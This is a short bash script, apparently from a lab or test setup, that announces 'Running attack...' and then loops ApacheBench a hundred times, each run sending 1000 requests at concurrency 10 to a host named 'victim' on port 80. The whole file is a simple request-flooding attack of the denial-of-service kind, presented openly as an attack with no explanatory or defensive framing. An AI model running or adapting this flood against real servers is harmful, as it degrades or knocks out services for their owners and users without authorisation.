#!/bin/bash

sleep 5

echo "Running attack..."

for i in {1..100}; do
	ab -n 1000 -c 10 http://victim:80/
done
